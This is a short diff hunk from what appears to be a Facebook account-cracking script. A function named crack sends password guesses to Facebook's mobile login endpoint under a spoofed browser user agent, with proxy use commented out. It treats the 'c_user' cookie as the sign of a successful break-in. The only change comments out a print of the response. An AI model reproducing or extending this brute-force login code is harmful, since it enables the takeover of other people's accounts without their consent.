@@ -165,7 +165,7 @@ def crack(uid, pww, total_idz):
             'user-agent': useragent_facebook(),
             'viewport-width': '980',}
             response = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
-            print(response)
+            #print(response)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
